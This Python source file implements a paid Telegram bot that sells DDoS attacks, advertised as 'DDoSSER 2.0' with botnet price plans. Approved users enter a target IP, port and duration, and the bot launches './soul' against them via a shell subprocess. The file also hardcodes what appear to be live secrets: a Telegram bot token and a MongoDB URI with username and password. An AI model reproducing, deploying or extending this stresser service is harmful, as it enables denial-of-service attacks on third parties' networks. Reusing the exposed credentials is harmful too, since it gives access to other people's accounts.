import os
import telebot
import asyncio
from pymongo import MongoClient
import logging
import certifi
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
from threading import Thread
from datetime import datetime, timedelta

TOKEN = "7350522142:AAFookihpKff0mFwksI2Pc2cy3NwzRNiruw"
MONGO_URI = "mongodb+srv://Bishal:Bishal@bishal.dffybpx.mongodb.net/?retryWrites=true&w=majority&appName=Bishal"

# Setup logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)


client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['zoya']
users_collection = db.users
codes_collection = db.codes  

bot = telebot.TeleBot(TOKEN)

loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

REQUEST_INTERVAL = 1
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
running_processes = []
REMOTE_HOST = '4.213.71.147'
CHANNEL_ID = -1002149443669
VALID_DURATIONS = [240, 480, 620, 860, 1000, 1240, 1480, 1620, 1860, 2000]
BOT_OWNER_ID = 5510109123
def generate_unique_code():
    import random
    import string
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)

async def run_attack_command_on_codespace(message, target_ip, target_port, duration):
    command = f"./soul {target_ip} {target_port} {duration} 60"
    try:
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        running_processes.append(process)
        stdout, stderr = await process.communicate()
        output = stdout.decode()
        error = stderr.decode()

        if output:
            logging.info(f"Command output: {output}")
        if error:
            logging.error(f"Command error: {error}")
            if "Invalid address/ Address not supported" in error:
                bot.send_message(message.chat.id, "*Yᴏᴜ Hᴀᴠᴇ Gɪᴠᴇɴ Iɴᴠᴀʟɪᴅ Iᴘ Oʀ Pᴏʀᴛ Pʟᴇᴀsᴇ Gɪᴠᴇ Vᴀʟɪᴅ Iᴘ Oʀ Pᴏʀᴛ*", parse_mode='Markdown')

    except Exception as e:
        logging.error(f"Failed to execute command on Codespace: {e}")
    finally:
        if process in running_processes:
            running_processes.remove(process)

def check_user_approval(user_id):
    user_data = users_collection.find_one({"user_id": user_id})
    if user_data and user_data['plan'] > 0:
        return True
    return False

def send_not_approved_message(chat_id):
    bot.send_message(chat_id, "*Yᴏᴜ Aʀᴇ Nᴏᴛ Aᴘᴘʀᴏᴠᴇᴅ*", parse_mode='Markdown')

def is_instant_plus_plan(user_id):
    user_data = users_collection.find_one({"user_id": user_id})
    if user_data and user_data['plan'] == 2:
        return True
    return False

@bot.message_handler(commands=['approve', 'disapprove'])
def approve_or_disapprove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    is_admin = bot.get_chat_member(CHANNEL_ID, user_id).status in ['administrator', 'creator']
    cmd_parts = message.text.split()

    if not is_admin:
        bot.send_message(chat_id, "*Yᴏᴜ Aʀᴇ Nᴏᴛ Aᴜᴛʜᴏʀɪᴢᴇᴅ Tᴏ Usᴇ Tʜɪs Cᴏᴍᴍᴀɴᴅ*", parse_mode='Markdown')
        return

    if len(cmd_parts) < 2:
        bot.send_message(chat_id, "*Iɴᴠᴀʟɪᴅ Cᴏᴍᴍᴀɴᴅ Fᴏʀᴍᴀᴛ\n✅ Usᴀɢᴇ :\n\n/approve <ᴜsᴇʀ_ɪᴅ> <ᴘʟᴀɴ> <ᴅᴀʏs>\n\n/disapprove <ᴜsᴇʀ_ɪᴅ>*", parse_mode='Markdown')
        return

    action = cmd_parts[0]
    target_user_id = int(cmd_parts[1])
    plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0
    days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0

    if action == '/approve':
        if plan == 1: 
            if users_collection.count_documents({"plan": 1}) >= 999:
                bot.send_message(chat_id, "*Approval failed: Instant Plan 🧡 limit reached (999 users).*", parse_mode='Markdown')
                return
        elif plan == 2: 
            if users_collection.count_documents({"plan": 2}) >= 999:
                bot.send_message(chat_id, "*Approval failed: Instant++ Plan 💥 limit reached (999 users).*", parse_mode='Markdown')
                return

        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": plan, "valid_until": valid_until, "access_count": 0}},
            upsert=True
        )
        msg_text = f"*Usᴇʀ {target_user_id} Aᴘᴘʀᴏᴠᴇᴅ Wɪᴛʜ Pʟᴀɴ {plan} Fᴏʀ {days} Dᴀʏs.*"
    else:  # disapprove
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": 0, "valid_until": "", "access_count": 0}},
            upsert=True
        )
        msg_text = f"*Usᴇʀ {target_user_id} Dɪsᴀᴘᴘʀᴏᴠᴇᴅ Aɴᴅ Rᴇᴠᴇʀᴛᴇᴅ Tᴏ Fʀᴇᴇ*"

    bot.send_message(chat_id, msg_text, parse_mode='Markdown')
    bot.send_message(CHANNEL_ID, msg_text, parse_mode='Markdown')


@bot.message_handler(commands=['Attack'])
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not check_user_approval(user_id):
        send_not_approved_message(chat_id)
        return

    try:
        bot.send_message(chat_id, "*Eɴᴛᴇʀ Tʜᴇ Tᴀʀɢᴇᴛ Iᴘ*", parse_mode='Markdown')
        bot.register_next_step_handler(message, process_ip)
    except Exception as e:
        logging.error(f"Error in attack command: {e}")

def process_ip(message):
    try:
        target_ip = message.text
        if not target_ip.replace('.', '').isdigit():
            bot.send_message(message.chat.id, "*Eʀʀᴏʀ*")
            return
        bot.send_message(message.chat.id, "*Eɴᴛᴇʀ Tʜᴇ Tᴀʀɢᴇᴛ Pᴏʀᴛ*", parse_mode='Markdown')
        bot.register_next_step_handler(message, process_port, target_ip)
    except Exception as e:
        logging.error(f"Error in processing IP: {e}")

def process_port(message, target_ip):
    try:
        target_port = int(message.text)
        if not (10000 <= target_port <= 30000):
            bot.send_message(message.chat.id, "*Pʟᴇᴀsᴇ Eɴᴛᴇʀ Vᴀʟɪᴅ Pᴏʀᴛ*", parse_mode='Markdown')
            return

        bot.send_message(message.chat.id, "*Eɴᴛᴇʀ Tʜᴇ Dᴜʀᴀᴛɪᴏɴ (240, 480, 620, 860, 1000, 1240, 1480, 1620, 1860, 2000 Seconds):*", parse_mode='Markdown')
        bot.register_next_step_handler(message, process_duration, target_ip, target_port)
    except ValueError:
        bot.send_message(message.chat.id, "*Eʀʀᴏʀ*")
    except Exception as e:
        logging.error(f"Error in processing port: {e}")

def process_duration(message, target_ip, target_port):
    try:
        duration = int(message.text)
        if duration not in VALID_DURATIONS:
            bot.send_message(message.chat.id, "*Iɴᴠᴀʟɪᴅ Dᴜʀᴀᴛɪᴏɴ Pʟᴇᴀsᴇ Eɴᴛᴇʀ Oɴᴇ Oғ Tʜᴇ Fᴏʟʟᴏᴡɪɴɢ Vᴀʟᴜᴇs:\n240, 480, 620, 860, 1000, 1240, 1480, 1620, 1860, 2000 (sᴇᴄᴏɴᴅs)*", parse_mode='Markdown')
            return

        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*Pᴏʀᴛ {target_port} Is Bʟᴏᴄᴋᴇᴅ Oʀ Is Tᴄᴘ Pᴏʀᴛ Pʟᴇᴀsᴇ Usᴇ A Dɪғғᴇʀᴇɴᴛ Pᴏʀᴛ Iɴ Uᴅᴘ*", parse_mode='Markdown')
            return

        asyncio.run_coroutine_threadsafe(run_attack_command_on_codespace(message, target_ip, target_port, duration), loop)
        bot.send_message(message.chat.id, f"*🚀 Aᴛᴛᴀᴄᴋ Sᴛᴀʀᴛᴇᴅ 🚀\n\n🎯 Tᴀʀɢᴇᴛ : {target_ip} {target_port}\n⌛ Dᴜʀᴀᴛɪᴏɴ : {duration} Sᴇᴄᴏɴᴅs*", parse_mode='Markdown')
    except ValueError:
        bot.send_message(message.chat.id, "*Eʀʀᴏʀ*")
    except Exception as e:
        logging.error(f"Error in processing duration: {e}")


@bot.message_handler(commands=['redeem'])
def redeem_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    # Check if the user is already approved
    if check_user_approval(user_id):
        bot.send_message(chat_id, "*Yᴏᴜ Aʀᴇ Aʟʀᴇᴀᴅʏ Aɴ Aᴘᴘʀᴏᴠᴇᴅ Usᴇʀ Aɴᴅ Cᴀɴɴᴏᴛ Rᴇᴅᴇᴇᴍ Aɴᴏᴛʜᴇʀ Cᴏᴅᴇ*", parse_mode='Markdown')
        return

    # Get the code from the message
    code = message.text.split()[1] if len(message.text.split()) > 1 else ""
    if not code:
        bot.send_message(chat_id, "*Pʟᴇᴀsᴇ Pʀᴏᴠɪᴅᴇ A Cᴏᴅᴇ Tᴏ Rᴇᴅᴇᴇᴍ*", parse_mode='Markdown')
        return

    # Check if the code exists in the database
    code_data = codes_collection.find_one({"code": code})
    if not code_data:
        bot.send_message(chat_id, "*Iɴᴠᴀʟɪᴅ Oʀ Exᴘɪʀᴇᴅ Cᴏᴅᴇ*", parse_mode='Markdown')
        return

    # Redeem the code by updating the user's plan
    users_collection.update_one(
        {"user_id": user_id},
        {"$set": {"plan": 2, "redeemed_code": code}}
    )
    bot.send_message(chat_id, "*Cᴏᴅᴇ Rᴇᴅᴇᴇᴍᴇᴅ Sᴜᴄᴄᴇssғᴜʟʟʏ! Yᴏᴜ Nᴏᴡ Hᴀᴠᴇ Aᴄᴄᴇss Tᴏ Pᴀɪᴅ Usᴇʀ's Cᴏᴍᴍᴀɴᴅs*", parse_mode='Markdown')

    # Remove the code from the database after it has been redeemed
    codes_collection.delete_one({"code": code})

@bot.message_handler(commands=['gen'])
def gen_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if user_id != BOT_OWNER_ID:
        bot.send_message(chat_id, "*Yᴏᴜ Aʀᴇ Nᴏᴛ Aᴜᴛʜᴏʀɪᴢᴇᴅ Tᴏ Usᴇ Tʜɪs Cᴏᴍᴍᴀɴᴅ*", parse_mode='Markdown')
        return

    cmd_parts = message.text.split()
    if len(cmd_parts) != 3:
        bot.send_message(chat_id, "*Iɴᴠᴀʟɪᴅ Cᴏᴍᴍᴀɴᴅ Fᴏʀᴍᴀᴛ\nUsᴇ /gen <ʟᴇɴɢᴛʜ> <ᴅᴀʏs>*", parse_mode='Markdown')
        return

    try:
        howmany = int(cmd_parts[1])
        days = int(cmd_parts[2])
    except ValueError:
        bot.send_message(chat_id, "*Lᴇɴɢᴛʜ Aɴᴅ Dᴀʏs Mᴜsᴛ Bᴇ Iɴᴛᴇɢᴇʀs*", parse_mode='Markdown')
        return

    if howmany <= 0 or days <= 0:
        bot.send_message(chat_id, "*Lᴇɴɢᴛʜ Aɴᴅ Dᴀʏs Mᴜsᴛ Bᴇ Iɴᴛᴇɢᴇʀs*", parse_mode='Markdown')
        return

    codes = []
    for _ in range(howmany):
        code = generate_unique_code()
        valid_until = (datetime.now() + timedelta(days=days)).isoformat()
        codes_collection.insert_one({"code": code, "valid_until": valid_until})
        codes.append(code)

    codes_list = "\n".join(codes)
    bot.send_message(chat_id, f"*Gᴇɴᴇʀᴀᴛᴇᴅ Cᴏᴅᴇs: {howmany}\nVᴀʟɪᴅ Tɪʟʟ {days} Dᴀʏs\nCᴏᴅᴇs:\n\n{codes_list}*", parse_mode='Markdown')


def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_asyncio_loop())

@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
    btn1 = KeyboardButton("Attack🚀")
    btn2 = KeyboardButton("Plan💸")
    btn3 = KeyboardButton("Canary Download✔️")
    btn4 = KeyboardButton("My Account🏦")
    btn5 = KeyboardButton("Help❓")
    btn6 = KeyboardButton("Contact admin✔️")
    markup.add(btn1, btn2, btn3, btn4, btn5, btn6)
    bot.send_message(message.chat.id, "*Choose an option:*", reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    if message.text == "Plan💸":
        user_name = message.from_user.first_name
        bot.reply_to(message, "Wᴇ Hᴀᴠᴇ Mᴀɴʏ Pʟᴀɴs Aɴᴅ Eᴠᴇʀʏ Pʟᴀɴ Is Pᴏᴡᴇʀғᴜʟʟ Tʜᴇɴ Oᴛʜᴇʀ's DDᴏS Aɴᴅ Tʜᴇʏ Aʀᴇ 𝐃𝐃ᴏ𝐒𝐒ᴇ𝐑 𝟐.𝟎 Pʟᴀɴs !!!\n\n💎 𝐃𝐃ᴏ𝐒𝐒ᴇ𝐑 𝟐.𝟎 💎\n\n🤖 Fᴇᴀᴛᴜʀᴇs :\n-> Aᴛᴛᴀᴄᴋ Tɪᴍᴇ - 600 Sᴇᴄᴏɴᴅs\n> Aғᴛᴇʀ Aᴛᴛᴀᴄᴋ Lɪᴍɪᴛ - Tɪʟʟ Fɪʀsᴛ Fɪɴɪsʜᴇs\n-> Aᴛᴛᴀᴄᴋ Tʜʀᴇᴀᴅs - 900\n> Wᴏʀᴋɪɴɢ Aᴛᴛᴀᴄᴋ - 10/10\n-> Fᴜʟʟ Sᴀғᴇ Wɪᴛʜ Nᴏ Bᴀɴ Issᴜᴇ\n\n💸 Pʀɪᴄᴇ Lɪsᴛ :\n24 Hᴏᴜʀs     ⏱️ = ₹ 100   💵\n7 Dᴀʏs          ⏱️ = ₹ 200   💵\n30 Dᴀʏs        ⏱️ = ₹ 400   💵", parse_mode='Markdown')
    elif message.text == "Canary Download✔️":
        bot.send_message(message.chat.id, "*Pʟᴇᴀsᴇ Usᴇ Tʜᴇ Fᴏʟʟᴏᴡɪɴɢ Lɪɴᴋ Fᴏʀ Cᴀɴᴀʀʏ Dᴏᴡɴʟᴏᴀᴅ : https://t.me/noobcheatsofficial/126*", parse_mode='Markdown')
    elif message.text == "My Account🏦":
        user_id = message.from_user.id
        user_data = users_collection.find_one({"user_id": user_id})
        if user_data:
            username = message.from_user.username
            plan = user_data.get('plan', 'N/A')
            valid_until = user_data.get('valid_until', 'N/A')
            current_time = datetime.now().isoformat()
            response = (f"*👤 Usᴇʀɴᴀᴍᴇ : @{username}\n"
                        f"💎 Pʟᴀɴ : {plan}\n"
                        f"⏱️ Vᴀʟɪᴅ Uɴᴛɪʟ : {valid_until}\n"
                        f"🕛 Cᴜʀʀᴇɴᴛ Tɪᴍᴇ : {current_time}*")
        bot.reply_to(message, response, parse_mode='Markdown')
    elif message.text == "Help❓":
        bot.reply_to(message, "*1. Aᴛᴛᴀᴄᴋ🚀 : Tᴏ Aᴛᴛᴀᴄᴋ\n2. Pʟᴀɴ💸 : Oᴜʀ BᴏᴛNᴇᴛ Pʀɪᴄᴇs\n3. Mʏ Aᴄᴄᴏᴜɴᴛ🏦 : Yᴏᴜʀ Iɴғᴏʀᴍᴀᴛɪᴏɴ\n4. Cᴏɴᴛᴀᴄᴛ ᴀᴅᴍɪɴ✔️ : Bᴏᴛ Aᴅᴍɪɴ*", parse_mode='Markdown')
    elif message.text == "Contact admin✔️":
        bot.reply_to(message, "*👤 Cᴏɴᴛᴀᴄᴛ Aᴅᴍɪɴ :\n1. @legend_noobcheats\n2. @daku_noobcheats\n3. @carlo_noobcheats*", parse_mode='Markdown')
    if not check_user_approval(message.from_user.id):
        send_not_approved_message(message.chat.id)
        return
    if message.text == "Attack🚀":
        bot.reply_to(message, "*🤖 [ Aᴛᴛᴀᴄᴋ🚀 ] Cᴏᴍᴍᴀɴᴅ Fᴏᴜɴᴅ 🤖\n🚀 Pʀᴏᴄᴇssɪɴɢ Aᴛᴛᴀᴄᴋ Cᴏᴍᴍᴀɴᴅ...*", parse_mode='Markdown')
        attack_command(message)
    else:
        bot.reply_to(message, "*⚠️ Iɴᴠᴀʟɪᴅ Oᴘᴛɪᴏɴ ⚠️*", parse_mode='Markdown')

if __name__ == "__main__":
    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
    asyncio_thread.start()
    logging.info("Starting Telegram bot...")

    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"An error occurred while polling: {e}")
        logging.info(f"Waiting for {REQUEST_INTERVAL} seconds before the next request...")
        asyncio.sleep(REQUEST_INTERVAL)
        